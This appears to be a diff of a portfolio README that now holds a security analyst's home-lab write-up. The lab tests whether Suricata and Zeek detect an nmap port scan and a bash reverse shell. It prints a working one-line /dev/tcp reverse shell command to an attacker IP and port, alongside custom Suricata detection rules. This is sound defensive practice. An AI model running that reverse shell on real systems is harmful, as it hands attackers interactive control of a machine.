@@ -1,37 +1,128 @@
-# Analyst Labs
+# Network Threat Hunting Lab
 
-Hands-on security projects built to practice the full workflow of a security analyst: discover, investigate, remediate, and document — the way it's actually done on the job, not just in theory.
+**Author:** Praveen Gaikwad
+**Date:** September 2026
+**Environment:** Personal VirtualBox lab (isolated internal network, no production data)
 
-Each project below is self-contained, with its own write-up, evidence, and findings.
+## 1. Objective
 
-## Projects
+Signature-based detection tools are the backbone of most SOC environments, but they are not infallible — default rulesets are built around known-bad patterns and can miss both common reconnaissance techniques and quiet, interactive attacker sessions that don't match any known signature. This project builds a small, isolated network monitoring lab, tests two real attack techniques against it, evaluates whether default detection coverage catches them, and — where it doesn't — writes and deploys custom detection rules to close the gap.
 
-### ✅ [AWS S3 Misconfiguration Audit](./aws-s3-misconfiguration-audit)
-Simulated a cloud security audit across four S3 buckets, each representing a distinct real-world misconfiguration pattern (public bucket policy, public ACL, overly broad "authenticated" policy). Proved each exposure was exploitable via browser and `curl`, investigated an unexpected result using AWS CLI, cross-verified a finding against official AWS documentation, then remediated and re-verified every issue.
+Every finding is cross-validated using two independent tools with different detection philosophies: **Suricata** (signature/threshold-based intrusion detection) and **Zeek** (behavioral connection metadata logging). The goal is to practice the full detection-engineering lifecycle: **deploy → attack → observe the gap → tune → re-test → confirm**, and to understand *why* two different tools together give more confidence than either alone.
 
-**Tools:** AWS Console, AWS CLI, `curl`
+## 2. Scope
+
+| Component | Role | Details |
+|---|---|---|
+| `Kali` | Attacker | Kali Linux, IP `192.168.100.20`, runs `nmap` and `netcat` |
+| `Zeek-Suricata-Lab` | Sensor / target | Ubuntu Server 26.04.1 LTS, IP `192.168.100.10`, runs Suricata 8.0.6 and Zeek 8.2.2 |
+| `labnet` | Network | VirtualBox Internal Network — fully isolated from the host and internet, mirroring the isolation approach used in the AWS S3 Audit project |
+
+Both VMs also retain a separate NAT adapter, used only for downloading packages — completely separate from the `labnet` segment they attack each other over.
+
+## 3. Methodology
+
+1. Build two VMs on an isolated internal network; configure static IPs
+2. Install Suricata (signature-based IDS) and Zeek (connection metadata logger) on the sensor VM
+3. For each attack scenario:
+   - Execute the attack from Kali
+   - Check whether the default Suricata ruleset (Emerging Threats Open, ~52,652 signatures) generated an alert
+   - If not, write a custom Suricata rule targeting the observed behavior
+   - Re-run the attack and confirm detection
+   - Independently confirm the same event using Zeek's `conn.log`, which logs connection metadata regardless of whether any signature matched
+4. Compare what each tool's evidence reveals on its own, and what only becomes visible when the two are used together
+
+## 4. Findings
+
+### 4.1 Scenario 1 — Port Scan Detection
+
+**Attack:** `sudo nmap -sT -Pn 192.168.100.10` — a full TCP connect scan against the sensor's 1,000 most common ports, run from Kali.
+
+![nmap scan results](screenshots/port-scan-detection-confirmed.png)
+*The scan itself, showing real open ports discovered on the target (22, 25, 465, 587)*
+
+**Finding:** The default Suricata ruleset alone did not generate any alert for this scan. A custom threshold-based rule was written and deployed:
+
+```
+alert tcp any any -> $HOME_NET any (msg:"POSSIBLE NMAP SYN SCAN DETECTED"; flags:S; threshold: type both, track by_src, count 20, seconds 60; sid:1000001; rev:1;)
+```
+
+This rule triggers only when a single source sends 20 or more SYN packets within 60 seconds — a pattern consistent with automated scanning rather than normal use. Re-running the scan after deploying this rule produced an immediate alert.
+
+![Suricata alert for port scan](screenshots/port-scan-suricata-alert-confirmed.png)
+*Suricata's fast.log showing the fired alert, with source IP, destination IP, and port*
+
+**Independent Zeek confirmation:** Zeek's `conn.log` recorded dozens of individual connection entries — one per port touched — each marked `conn_state: REJ` with `history: Sr` (SYN sent, RST received). The entries cluster within milliseconds of each other across many different destination ports, from a single source — a clear behavioral fingerprint of a scan, visible from connection metadata alone, independent of any signature match.
+
+![Zeek connection log for port scan](screenshots/port-scan-zeek-conn-log.png)
+*Zeek's conn.log showing the full run of rejected connection attempts generated by the scan*
+
+**Impact:** Demonstrates that default IDS rulesets can miss common reconnaissance techniques without dedicated scan-detection tuning, and that connection metadata alone is often sufficient to independently confirm scanning behavior.
+
+**Risk Rating:** Medium (reconnaissance — typically a precursor to further attack activity, not damaging on its own)
 
 ---
 
-### 🔧 Active Directory Attack & Detection Lab — *in progress*
-Multi-VM Active Directory environment for practicing common attack techniques (Kerberoasting, Pass-the-Hash, lateral movement) and building corresponding Splunk detections against Sysmon telemetry, mapped to MITRE ATT&CK.
+### 4.2 Scenario 2 — Reverse Shell Detection
 
-**Tools:** Sysmon, Splunk, Active Directory, Windows Server
+**Attack:** From Kali, a listener was started with `nc -lvnp 4444`. From the sensor VM, a classic bash reverse shell was triggered:
+
+```
+bash -i >& /dev/tcp/192.168.100.20/4444 0>&1
+```
+
+This causes the target machine to reach *out* to the attacker and hand over an interactive shell — the same technique used in real intrusions immediately after initial access is gained.
+
+**Finding — before a custom rule:** The connection succeeded, giving Kali full interactive shell access to the sensor VM. The default Suricata ruleset generated **zero alerts** for this connection. This is a genuine and realistic detection gap, not a setup failure: a single, ordinary-looking TCP connection carrying an interactive shell has no obvious signature to match against. Most default IDS rulesets are built around known exploit and malware patterns, not around "is this plain-looking connection behaving unusually."
+
+**Remediation — custom rule deployed:**
+
+```
+alert tcp $HOME_NET any -> any 4444 (msg:"POSSIBLE REVERSE SHELL - OUTBOUND CONNECTION TO PORT 4444"; flow:to_server,established; sid:1000002; rev:1;)
+```
+
+After deploying this rule, the same attack technique was re-run multiple times and consistently detected:
+
+![Suricata alert for reverse shell](screenshots/reverse-shell-suricata-alert-confirmed.png)
+*Suricata's fast.log showing the reverse shell alert firing across multiple connection attempts*
+
+**Independent Zeek confirmation — the strongest evidence in this project:** Zeek's `conn.log` recorded the reverse shell connection with a **58.7-second duration** and `history: DcAF` (indicating active data exchange in both directions) — in stark contrast to every port-scan connection nearby, which lasted a fraction of a millisecond with no data transferred at all.
+
+![Zeek connection log for reverse shell](screenshots/reverse-shell-zeek-conn-log.png)
+*Zeek's conn.log showing the reverse shell's abnormal duration and data-exchange pattern compared to surrounding scan traffic*
+
+This duration and data-flow anomaly is visible **by eye, with no alert required at all** — an analyst reviewing this log could reasonably flag it purely from behavior.
+
+**Impact:** Reverse shells represent a genuine, common blind spot for signature-based detection alone. This finding demonstrates the value of behavioral/anomaly-based analysis (available through Zeek's connection metadata) as a *complement* to signature-based detection (Suricata), not a replacement for it — each catches things the other can miss.
+
+**Risk Rating:** Critical (represents an active, interactive command-and-control channel — a post-exploitation stage, not just reconnaissance)
+
+## 5. Recommendations
+
+| Finding | Recommendation |
+|---|---|
+| Default ruleset missed the port scan | Deploy a threshold-based custom rule (as above) or enable a dedicated portscan-detection ruleset in production |
+| Default ruleset missed the reverse shell entirely | Deploy behavior/port-based custom rules as an interim measure. In production, a port-only rule is easily evaded by using common allowed ports (443, 80, 53) instead of 4444 — pair with connection-duration or data-volume based detection for broader coverage |
+| Signature-based detection alone is insufficient for interactive sessions | Maintain regular review of connection metadata (duration, byte counts, history codes) as a compensating control, not just alert-driven triage |
+| Network-only visibility has limits | Encrypted C2 channels would evade payload-based inspection entirely; pair network monitoring with host-based logging (e.g. process/command auditing) for defense in depth |
+
+## 6. Key Takeaways
+
+- **Signature-based detection has real, demonstrable blind spots.** Both attack techniques in this project went undetected by the default ruleset until a custom rule was written — this is a normal, expected limitation of any signature-based tool, not a misconfiguration.
+- **Writing custom detection rules is a core detection-engineering skill**, distinct from simply operating a pre-built tool. Understanding rule syntax (`flags`, `threshold`, `flow`) well enough to close an observed gap is more valuable than memorizing default alerts.
+- **Connection metadata can reveal what signatures miss.** The reverse shell's 58-second duration and bidirectional data flow was visible in Zeek's logs independent of any alert — a concrete example of behavioral/anomaly-based analysis complementing signature matching.
+- **Cross-validating findings across independent tools increases confidence.** Every finding in this report was confirmed two ways — a Suricata alert and an independent Zeek log entry — before being treated as confirmed, mirroring how a real investigation should avoid relying on a single data source.
+- **Infrastructure reliability is part of the job.** A significant portion of this project's effort went into diagnosing real networking issues (non-persistent IP assignments after reboot, incorrect routing tables, service restart timing) — skills equally relevant to detection logic itself.
+
+## 7. Tools Used
+
+VirtualBox (Internal Network mode), Ubuntu Server 26.04.1 LTS, Kali Linux, Suricata 8.0.6, Zeek 8.2.2, `suricata-update` (Emerging Threats Open ruleset), `nmap`, `netcat`, custom Suricata rules.
+
+## 8. References
+
+- [Suricata Rules Format — Official Documentation](https://docs.suricata.io/en/suricata-8.0.4/rules/intro.html) — used as the reference for custom rule syntax (Section 4.1, 4.2)
+- [Zeek conn.log Reference — Book of Zeek](https://docs.zeek.org/en/lts/logs/conn.html) — used to interpret `conn_state` and `history` field codes (Section 4.1, 4.2)
 
 ---
 
-### ✅ [Network Threat Hunting Lab](./network-threat-hunting-lab)
-Built an isolated two-VM lab (Suricata + Zeek) and ran two real attack scenarios — a TCP port scan and a bash reverse shell — against it. Discovered the default Suricata ruleset missed both, wrote and deployed custom detection rules to close each gap, then cross-validated every finding using Zeek's independent connection metadata. Includes a documented example of signature-based detection failing on a reverse shell that was still visible through behavioral/connection-duration analysis alone.
-
-**Tools:** Suricata, Zeek, VirtualBox (Internal Network), Kali Linux, `nmap`, `netcat`
-
----
-
-### 🔧 SOC Automation Lab — *planned*
-Automated incident response pipeline: detection in Wazuh triggers enrichment via VirusTotal through Shuffle (SOAR), with case creation in TheHive.
-
-**Tools:** Wazuh, Shuffle, TheHive, VirusTotal API
-
-## Background
-
-Built while transitioning into cybersecurity, backed by ISC2 Certified in Cybersecurity and Google Cybersecurity certifications. Each project follows the same standard: don't just configure something — break it, prove it's broken, investigate root cause, fix it, and prove the fix works.
+*This lab was built and tested in a personal, isolated VirtualBox environment using synthetic attack traffic. No production systems or real third-party networks were involved.*
